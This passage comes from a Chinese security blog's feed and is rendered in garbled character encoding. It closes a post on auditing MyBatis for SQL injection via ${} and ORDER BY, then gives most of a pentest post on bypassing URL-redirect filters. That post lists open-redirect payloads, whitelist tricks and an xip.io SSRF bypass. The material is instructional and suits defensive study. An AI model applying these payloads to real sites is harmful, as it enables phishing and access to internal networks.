}ã€‚</p></li><li><p>ä½¿ç”¨#{ }æ¥é˜²æ­¢SQLæ³¨å…¥ï¼Œä½¿ç”¨${ }æ¥åŠ¨æ€æ‹¼æ¥å‚æ•°ã€‚</p></li></ul><h3><span id="å¦‚ä½•æ’æŸ¥">å¦‚ä½•æ’æŸ¥</span></h3><ul><li><p>æ£€æŸ¥æ˜¯å¦æœ‰$å·</p><ul><li>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯IDEAï¼Œé‚£ä¹ˆé€šè¿‡å¿«æ·é”®Ctrl+Shift+Ræ‰“å¼€çª—å£ï¼Œé€šè¿‡å…¨å±€æœç´¢${ , å¿«é€Ÿå®šä½åˆ°ä½¿ç”¨${ }æ‹¼æ¥SQLçš„è¯­å¥ï¼Œåœ¨å»æ‰¾åˆ°å¤–éƒ¨ä¼ å…¥å‚æ•°çš„å…¥å£ï¼Œé—­åˆsqlè¯æ˜å³å¯ã€‚</li></ul></li><li><p>æ£€æŸ¥æ˜¯å¦æœ‰order by</p><ul><li>åŒæ ·çš„åœ¨æœç´¢æ˜¯å¦ä½¿ç”¨order by æ’åºè¯­å¥ï¼Œå¦‚æœæœ‰ä¸€æ­¥ä¸€æ­¥è¿½è¸ªæ˜¯å¦æœ‰å¤–éƒ¨å‚æ•°ï¼Œæœªè¿‡æ»¤å°±ç›´æ¥ä¼ é€’åˆ°order byè¯­å¥é‡Œé¢æ¥ã€‚</li></ul></li></ul><h3><span id="ä¸ºä»€ä¹ˆ-å°±å®‰å…¨">ä¸ºä»€ä¹ˆ#{ }å°±å®‰å…¨</span></h3><ul><li><p>å› ä¸ºâ€#{}â€é‡‡ç”¨JDBCé¢„ç¼–è¯‘æ¨¡å¼ï¼Œè¿™ç§å†™æ³•å¯ä»¥å¾ˆå¥½åœ°é¿å…SQLæ³¨å…¥æ¼æ´çš„äº§ç”Ÿã€‚ç±»ä¼¼å¦‚ä¸‹SQLè¯­å¥ï¼Œ</p></li><li><p>ä½¿ç”¨ ${ }æ•ˆæœæ˜¯:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from testtable where id=&quot;1&quot; or true or id  # 1åé¢å°±æ˜¯è¢«æ”»å‡»è€…æ¶æ„æ„é€ çš„å­—ç¬¦</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MiODTe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/07/MiODTe.jpg" alt="MiODTe.jpg"></a></p></li><li><p>è€Œä½¿ç”¨ #{ } çš„æ•ˆæœæ˜¯:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from testtable where id=&quot;1\&quot; or true or id\&quot;&quot;   # 1åé¢å°±æ˜¯è¢«æ”»å‡»è€…æ¶æ„æ„é€ çš„å­—ç¬¦</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MiOdOK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/07/MiOdOK.jpg" alt="MiOdOK.jpg"></a></p></li></ul><h3><span id="ä»€ä¹ˆæƒ…å†µä¸‹ç”¨ä¸äº†">ä»€ä¹ˆæƒ…å†µä¸‹ç”¨ä¸äº†#{}</span></h3><ul><li><p>order by æ’åºæƒ…å†µä¸è¡Œã€‚ä¸ºä»€ä¹ˆï¼Ÿ</p></li><li><p>å…ˆå¤ä¹ ä¸€ä¸‹order byçš„ç”¨æ³•ï¼š#<br>order byå°±æ˜¯ä¸€ä¸ªæ’åºçš„å·¥å…·ï¼Œè·Ÿæˆ‘è¯»ä¸€éï¼šâ€œorder byå°±æ˜¯ä¸€ä¸ªæ’åºçš„å·¥å…·â€ã€‚</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># è¿™ä¸ª1å°±æ˜¯æŒ‡ç¬¬ä¸€ä¸ªåˆ—ç´¢å¼•ï¼Œä¹Ÿå¯ä»¥å†™id ï¼ˆåˆ—ç´¢å¼•ï¼‰</span><br><span class="line">select * from testtable ORDER BY 1 ASC #ASCè¡¨ç¤ºæŒ‰å‡åºæ’åº,DESCè¡¨ç¤ºæŒ‰é™åºæ’åº</span><br><span class="line"># ä¸¤ä¸ªä»£ç æ˜¯ä¸€æ ·çš„</span><br><span class="line">select * from testtable ORDER BY id ASC #ASCè¡¨ç¤ºæŒ‰å‡åºæ’åº,DESCè¡¨ç¤ºæŒ‰é™åºæ’åº</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MiOBwD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/07/MiOBwD.jpg" alt="MiOBwD.jpg"></a></p></li><li><p>å¯¹äºorder by æˆ‘ä»¬æ˜¯ç”¨ä¸äº†#{}çš„ï¼Œå› ä¸ºç”¨äº†è¿™ä¸ªå°±ä¼šè¢«è‡ªåŠ¨è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œè‡ªåŠ¨åŠ å¼•å·ï¼Œè¿™æ ·è¯­å¥å°±ä¸ç”Ÿæ•ˆäº†ã€‚</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;selectStudentsByName&quot; resultType=&quot;Student&quot;&gt;</span><br><span class="line">    select id,name,age,score from student order by #&#123;column&#125;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;!--ç¼–è¯‘å‡ºæ¥çš„ç»“æœå¦‚ä¸‹ï¼š--&gt;</span><br><span class="line">select * from table order by &apos;column&apos;</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MiO0eO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/07/MiO0eO.jpg" alt="MiO0eO.jpg"></a></p></li><li><p>ä¼šå‘ç°åŠ ä¸Šâ€œâ€ åŒå¼•å·ç¬¦å·åï¼Œå°±æ²¡æ³•æ­£å¸¸æ’åºäº†ã€‚</p></li></ul><h3><span id="å¦‚ä½•è§£å†³">å¦‚ä½•è§£å†³ï¼š</span></h3><ul><li>ä½¿ç”¨${}ï¼ŒMyBatiså°±ä¸ä¼šä¿®æ”¹æˆ–è½¬ä¹‰æ”¹å­—ç¬¦ä¸²ã€‚ä½†æ˜¯è¿™æ ·åˆä¸å®‰å…¨ï¼Œä¼šå¯¼è‡´æ½œåœ¨çš„SQLæ³¨å…¥æ”»å‡»ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦è‡ªå·±å»é™åˆ¶ï¼Œä¸å…è®¸ç”¨æˆ·è¾“å…¥ä¸€äº›éæ³•å­—æ®µï¼Œæˆ–è€…é€šå¸¸è‡ªè¡Œè½¬ä¹‰å¹¶æ£€æŸ¥ã€‚æ‰€ä»¥è¿™å¿…é¡»è¿‡æ»¤è¾“å…¥çš„å†…å®¹ã€‚</li></ul><h3><span id="æ€»ç»“">æ€»ç»“ï¼š</span></h3><ul><li>å³ä½¿æ˜¯å®‰å…¨çš„sqlé¢„ç¼–è¯‘æŠ€æœ¯ï¼Œä¹Ÿæ˜¯æœ‰é€‚ç”¨èŒƒå›´çš„ï¼Œä¸€äº›åº”ç”¨åœºæ™¯ä¹Ÿæ˜¯ä¸é€‚ç”¨çš„ã€‚å½“æˆ‘ä»¬åœ¨åšé»‘ç›’æˆ–è€…å®¡è®¡çš„æ—¶å€™ï¼Œç¢°åˆ°äº†é¢„ç¼–è¯‘å¤„ç†ä¸äº†çš„åœºæ™¯ï¼Œæ¯”å¦‚è¯´æ’åºåŠŸèƒ½çš„æ—¶å€™å°±å¾—æ ¼å¤–æ³¨æ„ï¼Œå› ä¸ºè¿™é‡Œä¸ä»”ç»†å®¡æŸ¥ï¼Œæ—¥åå°±æ˜¯ä¸€ä¸ªç¥¸ç«¯ã€‚</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#mybatisæ£€æŸ¥sqlæ³¨å…¥æ€»ç»“&quot;&gt;Mybatisæ£€æŸ¥SQLæ³¨å…¥æ€»ç»“&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#mybatisçš„-å’Œ-çš„ç”±æ¥&quot;&gt;Mybatisçš„#{ }å’Œ${ }çš„ç”±æ¥#&lt;/a&gt;&lt;/li&gt;
&lt;li
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="http://www.vkxss.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Javaä»£ç å®¡è®¡" scheme="http://www.vkxss.top/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>å¦‚ä½•ç»•è¿‡URLé™åˆ¶</title>
    <link href="http://www.vkxss.top/2019/07/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87URL%E9%99%90%E5%88%B6/"/>
    <id>http://www.vkxss.top/2019/07/20/æ¸—é€æµ‹è¯•-å¦‚ä½•ç»•è¿‡URLé™åˆ¶/</id>
    <published>2019-07-20T04:25:40.000Z</published>
    <updated>2019-09-23T08:02:38.060Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#1-å¦‚ä½•ç»•è¿‡urlé™åˆ¶">1ã€å¦‚ä½•ç»•è¿‡URLé™åˆ¶</a><ul><li><a href="#11-æè¿°">1.1ã€æè¿°ï¼š</a></li><li><a href="#12-æ­£å¸¸æ€è·¯">1.2ã€æ­£å¸¸æ€è·¯ï¼š</a></li><li><a href="#13-payload">1.3ã€payloadï¼š</a></li><li><a href="#14-bypass">1.4ã€Bypass</a><ul><li><a href="#0x01-åˆ©ç”¨é—®å·ç»•è¿‡é™åˆ¶">0x01 åˆ©ç”¨é—®å·ç»•è¿‡é™åˆ¶</a></li><li><a href="#0x02-åˆ©ç”¨åæ–œæ å’Œæ­£æ–œæ ç»•è¿‡é™åˆ¶">0x02 åˆ©ç”¨åæ–œæ å’Œæ­£æ–œæ ç»•è¿‡é™åˆ¶</a></li><li><a href="#0x03-åˆ©ç”¨ç»•è¿‡urlé™åˆ¶">0x03 åˆ©ç”¨@ç»•è¿‡URLé™åˆ¶</a></li><li><a href="#0x04-åˆ©ç”¨ç™½åå•ç¼ºé™·ç»•è¿‡é™åˆ¶">0x04 åˆ©ç”¨ç™½åå•ç¼ºé™·ç»•è¿‡é™åˆ¶</a></li><li><a href="#0x05-å¤šé‡éªŒè¯è·³è½¬ç»•è¿‡é™åˆ¶">0x05 å¤šé‡éªŒè¯&amp;è·³è½¬ç»•è¿‡é™åˆ¶</a></li><li><a href="#0x06-ç‚¹å‡»è§¦å‘è¾¾åˆ°ç»•è¿‡urlè·³è½¬é™åˆ¶">0x06 ç‚¹å‡»è§¦å‘è¾¾åˆ°ç»•è¿‡URLè·³è½¬é™åˆ¶</a></li><li><a href="#0x07-åˆ©ç”¨xipioç»•è¿‡">0x07 åˆ©ç”¨xip.ioç»•è¿‡</a></li><li><a href="#0x08-åˆ©ç”¨è¶…é“¾æ¥ç»•è¿‡å¯ä¿¡ç«™ç‚¹é™åˆ¶">0x08 åˆ©ç”¨è¶…é“¾æ¥ç»•è¿‡å¯ä¿¡ç«™ç‚¹é™åˆ¶</a></li><li><a href="#0x09-postå‚æ•°ä¸­çš„urlè·³è½¬">0x09 POSTå‚æ•°ä¸­çš„URLè·³è½¬</a></li><li><a href="#0x10-åˆ©ç”¨å·ç»•è¿‡">0x10 åˆ©ç”¨#å·ç»•è¿‡</a></li><li><a href="#0x09-fuzz">0x09 FUZZ</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="1-å¦‚ä½•ç»•è¿‡urlé™åˆ¶">1ã€å¦‚ä½•ç»•è¿‡URLé™åˆ¶</span></h1><h2><span id="11-æè¿°">1.1ã€æè¿°ï¼š</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">URLé‡å®šå‘æ¼æ´ï¼ˆURL redirection vulnerabilityï¼‰ï¼Œæ˜¯ä¸€ç§å¸¸è§çš„Webå®‰å…¨æ¼æ´ï¼Œç”±äºç½‘ç«™URLé‡å®šå‘åŠŸèƒ½è®¾è®¡ä¸å½“ï¼Œæ²¡æœ‰éªŒè¯è·³è½¬çš„ç›®æ ‡URLæ˜¯å¦åˆæ³•ï¼Œç”¨æˆ·å¯é€šè¿‡æ­¤æ¼æ´è·³è½¬åˆ°ä»»æ„ç½‘ç«™ï¼Œè¿™ä¼šå¯¼è‡´å¯é€šè¿‡è¯¥ç½‘ç«™è·³è½¬åˆ°å­˜åœ¨æœ¨é©¬ã€ç—…æ¯’çš„ç½‘ç«™æˆ–è€…é’“é±¼ç½‘ç«™ï¼ŒæŸå®³ç½‘ç«™ç”¨æˆ·æƒåˆ©ã€ç½‘ç«™åèª‰ã€‚</font></li></ul><h2><span id="12-æ­£å¸¸æ€è·¯">1.2ã€æ­£å¸¸æ€è·¯ï¼š</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">å°±æ˜¯ç›´æ¥æ›¿æ¢åé¢çš„URLæ¥æ£€æµ‹æ˜¯å¦å­˜åœ¨ä»»æ„URLè·³è½¬ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå°±ç›´æ¥è¿”å›åˆ°å®ƒè‡ªå·±çš„åŸŸåï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±è·³è½¬åˆ°ä½ æŒ‡å®šçš„URL</font></li></ul><h2><span id="13-payload">1.3ã€payloadï¼š</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">- ///www.baidu.com/%2f%2e%2e</span><br><span class="line">- /https://%5cbaidu.com/</span><br><span class="line">- //www.baidu.com</span><br><span class="line">- /www.baidu.com</span><br><span class="line">- https://www.google.com/www.baidu.com</span><br><span class="line">- /%2Fbaidu%252Ecom</span><br><span class="line">- http://www.google.com\.baidu.com</span><br><span class="line">- http://www.google.com\@baidu.com</span><br><span class="line">- http://www.google.com\#baidu.com</span><br><span class="line">- http://www.google.com\?baidu.com</span><br><span class="line">- http://www.google.com\\baidu.com</span><br><span class="line">- http://www.google.com\baidu.com:</span><br></pre></td></tr></table></figure><h2><span id="14-bypass">1.4ã€Bypass</span></h2><h3><span id="0x01-åˆ©ç”¨é—®å·ç»•è¿‡é™åˆ¶">0x01 åˆ©ç”¨é—®å·ç»•è¿‡é™åˆ¶</span></h3><ul><li><font face="å¾®è½¯é›…é»‘">åˆ©ç”¨é—®å·ï¼Œè¿™æ˜¯ä¸€ä¸ªç‰¹æ€§ï¼Œåˆ©ç”¨é—®å·å¯ä»¥æˆåŠŸç»•è¿‡URLé™åˆ¶<br>æ¯”å¦‚ï¼š<a href="http://www.aaa.com/acb?Url=http://login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://login.aaa.com</a> è¿™æ˜¯ä¸€ä¸ªè·³è½¬é“¾æ¥ï¼Œè·³è½¬åˆ°å®ƒçš„äºŒçº§åŸŸåä¸‹ï¼Œé‚£ä¹ˆè¿™ä¸ªé—®å·æ”¾å“ªé‡Œå¯ä»¥ç»•è¿‡å‘¢ï¼Ÿå…¶å®å°±æ˜¯æ”¾åˆ°å®ƒè‡ªèº«çš„åŸŸåå‰é¢ä¹Ÿå°±æ˜¯ä½ æ·»åŠ çš„æƒ³è¦è·³è½¬çš„åŸŸåçš„åé¢ï¼Œå¦‚ï¼š<a href="http://www.aaa.com/acb?Url=http://test.com?login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com?login.aaa.com</a> é‚£ä¹ˆï¼Œå®ƒå…¶å®æ˜¯ä¼šè·³è½¬åˆ°è¿™ä¸ªtest.comåŸŸåä¸‹ï¼Œè¿™ä¸ªåŸŸåæ˜¯æˆ‘æƒ³è¦è·³è½¬çš„ä»»æ„åŸŸåï¼Œè€Œåé¢çš„å®ƒè‡ªèº«åŸŸåä¸€å®šè¦å¸¦ä¸Šï¼Œä¸å¸¦ä¸Šå°±æ— æ³•è¾…åŠ©ç”¨é—®å·?è¿™ä¸ªç‰¹æ€§æ¥è·³è½¬åˆ°æŒ‡å®šåŸŸåäº†ï¼Œè€Œè·³è½¬åï¼Œé—®å·å’Œé—®å·åé¢çš„å†…å®¹ä¼šå˜ä¸ºè¿™æ ·ï¼š<a href="http://www.test.com/?login.aaa.com" target="_blank" rel="noopener">http://www.test.com/?login.aaa.com</a></font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼šhttp://www.test.com/abcï¼Ÿurl=http//payload.com?test1.com</span><br></pre></td></tr></table></figure><h3><span id="0x02-åˆ©ç”¨åæ–œæ å’Œæ­£æ–œæ ç»•è¿‡é™åˆ¶">0x02 åˆ©ç”¨åæ–œæ å’Œæ­£æ–œæ ç»•è¿‡é™åˆ¶</span></h3><ul><li><font face="å¾®è½¯é›…é»‘">æ¯”å¦‚ï¼š<a href="http://www.aaa.com/acb?Url=http://login.aaa.com/" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://login.aaa.com/</a> åŒæ ·æ˜¯åœ¨å®ƒæœ¬èº«åŸŸåå‰åŠ ä¸Šæ­£æ–œæ ï¼Œç„¶åæ­£æ–œæ å‰é¢è·Ÿä¸Šä½ æƒ³è·³è½¬çš„åŸŸååœ°å€ã€‚<br>å¦‚ï¼š<a href="http://www.aaa.com/acb?Url=http://test.com/login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com/login.aaa.com</a><br>åæ–œæ æœ‰ä¸‰ç§æ€è·¯<br>ä¸¤ä¸ªåæ–œæ ç»•è¿‡æ–¹æ³•<br>æ¯”å¦‚ï¼š<a href="http://www.aaa.com/acb?Url=http://login.aaa.com/" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://login.aaa.com/</a> åŒæ ·æ˜¯åœ¨å®ƒæœ¬èº«åŸŸåå‰åŠ ä¸Šä¸¤ä¸ªåæ–œæ ï¼Œç„¶åä¸¤ä¸ªåæ–œæ å‰é¢è·Ÿä¸Šä½ æƒ³è·³è½¬çš„åŸŸååœ°å€ã€‚<br>å¦‚ï¼š<a href="http://www.aaa.com/acb?Url=http://test.com\login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com\login.aaa.com</a><br>ä¸€ä¸ªåæ–œæ ç»•è¿‡æ–¹æ³•<br>å¦‚ï¼š<a href="http://www.aaa.com/acb?Url=http://test.comlogin.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.comlogin.aaa.com</a><br>å¦ä¸€ç§æ€è·¯ï¼Œä¸€ä¸ªåæ–œæ ä¸€ä¸ªç‚¹<br>åˆ©ç”¨.è¿™æ ·çš„æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªåæ–œæ åŠ ä¸€ä¸ªç‚¹æ¥è·³è¿‡é™åˆ¶ï¼Œ<br>å¦‚ï¼š<a href="http://www.aaa.com/acb?Url=http://test.com.login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com.login.aaa.com</a></font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼š/ \  .</span><br></pre></td></tr></table></figure><h3><span id="0x03-åˆ©ç”¨ç»•è¿‡urlé™åˆ¶">0x03 åˆ©ç”¨@ç»•è¿‡URLé™åˆ¶</span></h3><ul><li><font face="å¾®è½¯é›…é»‘">å¦‚æœä½ ç”¨è¿™æ–¹æ³•åœ¨ç«ç‹é‡Œè¿›è¡Œè·³è½¬ï¼Œä¼šæœ‰å¼¹çª—æç¤ºï¼Œåœ¨å…¶å®ƒæ¸¸è§ˆå™¨åˆ™æ²¡æœ‰ã€‚<br>å¦‚ï¼š&lt;a href=â€<a href="http://www.aaa.com/acb?Url=http://login.aaa.com@test.comâ€œâ€&gt;http://www.aaa.com/acb?Url=http://login.aaa.com@test.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://login.aaa.com@test.comâ€œâ€&gt;http://www.aaa.com/acb?Url=http://login.aaa.com@test.com</a> åé¢çš„test.comå°±æ˜¯è¦è·³è½¬åˆ°çš„åŸŸåï¼Œå‰é¢çš„åŸŸåéƒ½æ˜¯ç”¨æ¥è¾…åŠ©ä»¥ç»•è¿‡é™åˆ¶çš„ã€‚</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼š@</span><br></pre></td></tr></table></figure><h3><span id="0x04-åˆ©ç”¨ç™½åå•ç¼ºé™·ç»•è¿‡é™åˆ¶">0x04 åˆ©ç”¨ç™½åå•ç¼ºé™·ç»•è¿‡é™åˆ¶</span></h3><ul><li><font face="å¾®è½¯é›…é»‘">æœ‰çš„åŸŸåç™½åå•é™åˆ¶æ˜¯ä¸å…¨çš„ï¼Œæ¯”å¦‚å¦‚æœæƒ³åˆ©ç”¨ä¸€ä¸ªè·³è½¬ï¼Œè€Œè¿™ä¸ªè·³è½¬æ˜¯é€šç”¨ï¼Œåœ¨è¿™ä¸ªå…¬å¸ç½‘ç«™å¾ˆå¤šå­åŸŸåç­‰éƒ½å¯ä»¥è·³è½¬ï¼Œé‚£ä¹ˆä½ ä¹°ä¸ªåŸŸåä¹Ÿä¸ç®—è´µå¯¹å§ã€‚<br>ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Œè¿™ä¸ªé—®é¢˜å°±æ˜¯ç™½åå•é™åˆ¶ä¸å½“ï¼Œæ¯”å¦‚ï¼Œå½“è·³è½¬çš„åŸŸååŒ…å«è¿™ä¸ªç½‘ç«™ä¸‹çš„æ‰€æœ‰åŸŸåï¼Œæ¯”å¦‚ï¼š<a href="http://www.aaa.com/acb?Url=http://login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://login.aaa.com</a><br>è¿™ä¸ªlogin.aaa.comä¹Ÿå¯ä»¥æ”¹æˆaaa.comåŒæ ·å¯ä»¥è·³è½¬å¯¹å§ï¼Œå› ä¸ºç™½åå•é‡Œåªè¦æœ‰åŒ…å«è¿™ä¸ªåŸŸåå°±ç›´æ¥æˆåŠŸè·³è½¬ã€‚<br>é‚£ä¹ˆå½“æˆ‘åœ¨è¿™ä¸ªåŸŸåå‰é¢åŠ ä¸Šå¦‚testaaa.comï¼Œç™½åå•é‡Œä¼šæ£€æŸ¥æ˜¯å¦åŒ…å«aaa.comè¿™ä¸ªåŸŸåï¼Œå¦‚æœåŒ…å«ï¼Œå°±ç›´æ¥è·³è½¬ï¼Œè€Œå¹¶æ²¡æœ‰æ£€æŸ¥è¿™ä¸ªåŸŸåçš„æ•´ä¸ªä¿¡æ¯ï¼Œç„¶åå¯ä»¥åˆ©ç”¨è¿™ä¸ªé—®é¢˜ï¼Œç›´æ¥æ³¨å†Œä¸€ä¸ªtestaaa.comè¿™ä¸ªåŸŸåå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·³è½¬ã€‚</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:testaaa.com</span><br></pre></td></tr></table></figure><h3><span id="0x05-å¤šé‡éªŒè¯ampè·³è½¬ç»•è¿‡é™åˆ¶">0x05 å¤šé‡éªŒè¯&amp;è·³è½¬ç»•è¿‡é™åˆ¶</span></h3><ul><li><font face="å¾®è½¯é›…é»‘">ç°åœ¨å¾ˆå¤šç½‘ç«™éƒ½æœ‰å¤šé‡éªŒè¯ï¼Œæ¯”å¦‚ä½ ç™»é™†è´¦æˆ·åä¼šå‡ºç°å¦ä¸€ä¸ªéªŒè¯é¡µé¢ï¼Œè¾“å…¥æ‰‹æœºéªŒè¯ç è¿›è¡ŒéªŒè¯ï¼Œæ­¤æ—¶è¿™ä¸Šé¢çš„URLå¾ˆå¯èƒ½å­˜åœ¨ä»»æ„è·³è½¬çš„é—®é¢˜ã€‚<br>å¤šé‡è·³è½¬çš„é—®é¢˜å¯¼è‡´å¯ç»•è¿‡URLé™åˆ¶<br>æ¯”å¦‚<a href="http://www.aaa.com/acb?Url=http" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http</a>: â€¦ ttp://login.aaa.com<br>å½“ç„¶ï¼Œè¿˜æœ‰å¤šé‡çš„ï¼Œè¿™ä¸ªç»“æ„çš„å¤šé‡è·³è½¬ä½ ä¿®æ”¹æœ€åé¢çš„URLå°±å¯ä»¥è¾¾åˆ°ä»»æ„URLè·³è½¬ï¼Œä¸­é—´çš„URLå°±æ²¡å¿…è¦åŠ¨äº†ã€‚</font></li></ul><h3><span id="0x06-ç‚¹å‡»è§¦å‘è¾¾åˆ°ç»•è¿‡urlè·³è½¬é™åˆ¶">0x06 ç‚¹å‡»è§¦å‘è¾¾åˆ°ç»•è¿‡URLè·³è½¬é™åˆ¶</span></h3><ul><li><font face="å¾®è½¯é›…é»‘">æ¯”å¦‚å¾ˆå¤šç™»é™†é¡µé¢çš„åœ°æ–¹ï¼Œå…¶URLæ˜¯ä¸€ä¸ªè·³è½¬çš„URL<br>å¦‚ï¼š<a href="http://www.aaa.com/acb?Url=http://test.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com</a><br>ä½ ç›´æ¥ä¿®æ”¹äº†åé¢ä¸ºä»»æ„URLï¼Œä½†æ˜¯è¿˜æ˜¯åœç•™åœ¨åŸåœ°ï¼Œä¼¼ä¹æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯ï¼Œå½“ä½ è¾“å…¥è´¦å·å’Œå¯†ç åç‚¹å‡»ç™»é™†æŒ‰é’®åï¼Œå°±ä¼šè§¦å‘è·³è½¬ã€‚<br>å½“ç„¶ï¼Œè¿™ä¸ªè´¦æˆ·å’Œå¯†ç ä¸ä¸€å®šè¦å¯¹çš„ï¼Œéšä¾¿éƒ½å¯ä»¥ï¼Œä½†å¾—è§†ç³»ç»Ÿè€Œå®šå§ã€‚<br>è¿™ä¸ªæˆ‘é‡åˆ°äº†å¾ˆå¤šï¼Œæ¯”å¦‚ä½ ä¿®æ”¹äº†åŸŸåï¼Œç„¶åç‚¹å‡»ç™»é™†ï¼Œç™»é™†æˆåŠŸåä¾¿å¯è§¦å‘è·³è½¬ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ¯”è¾ƒéšè”½çš„ç»•è¿‡URLé™åˆ¶çš„è·³è½¬ã€‚</font></li></ul><h3><span id="0x07-åˆ©ç”¨xipioç»•è¿‡">0x07 åˆ©ç”¨xip.ioç»•è¿‡</span></h3><ul><li><font face="å¾®è½¯é›…é»‘">è¿™ä¸ªæˆ‘è¿˜æ²¡æœ‰åœ¨æµ‹è¯•ä¸­åº”ç”¨è¿‡ï¼Œå…¶è¯·æ±‚æ˜¯<a href="http://www.127.0.0.1.xip.io" target="_blank" rel="noopener">http://www.127.0.0.1.xip.io</a> è¿™ä¸ªç»•è¿‡æ˜¯åœ¨SSRFåœºæ™¯ä¸­çš„ç»•è¿‡ï¼Œæ¯”å¦‚SSRFä½ è¦è¯»å–å†…ç½‘åœ°å€ï¼Œä¸€èˆ¬éƒ½åšäº†é™åˆ¶ï¼Œå¯ä»¥å°è¯•ç”¨è¿™æ–¹æ³•è¿›è¡Œç»•è¿‡é™åˆ¶ï¼Œä»è€Œè®¿é—®åˆ°å†…ç½‘ã€‚<br>å¦å¤–ä¸€ç‚¹ï¼ŒURLè·³è½¬æ¶‰åŠçš„å®‰å…¨é—®é¢˜å¤§å®¶å¸¸è§çš„å°±æ˜¯é’“é±¼ï¼Œé‚£ä¹ˆåˆ©ç”¨è¿™ä¸ªæ€è·¯ä¹Ÿå¯è¾¾æˆä¸€ä¸ªé’“é±¼é—®é¢˜ï¼Œå¦‚ï¼Œ<a href="http://www.qq.com.127.0.0.1.xip.io" target="_blank" rel="noopener">http://www.qq.com.127.0.0.1.xip.io</a><br>å½“ä½ è®¿é—®qqè¿™ä¸ªåŸŸåæ—¶ï¼Œå…¶å®è¿™ä¸ªé“¾æ¥å·²ç»è¢«è§£æåˆ°åé¢è¿™ä¸ªipåœ°å€ä¸Šäº†ï¼Œé‚£ä¹ˆå®é™…è®¿é—®çš„å°±æ˜¯åé¢è¿™ä¸ªIPåœ°å€ã€‚</font></li></ul><p><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H859abc96cb734526bc817af79bb78c37X.png" style="zoom:30%"></center></font></p><h3><span id="0x08-åˆ©ç”¨è¶…é“¾æ¥ç»•è¿‡å¯ä¿¡ç«™ç‚¹é™åˆ¶">0x08 åˆ©ç”¨è¶…é“¾æ¥ç»•è¿‡å¯ä¿¡ç«™ç‚¹é™åˆ¶</span></h3><ul><li><font 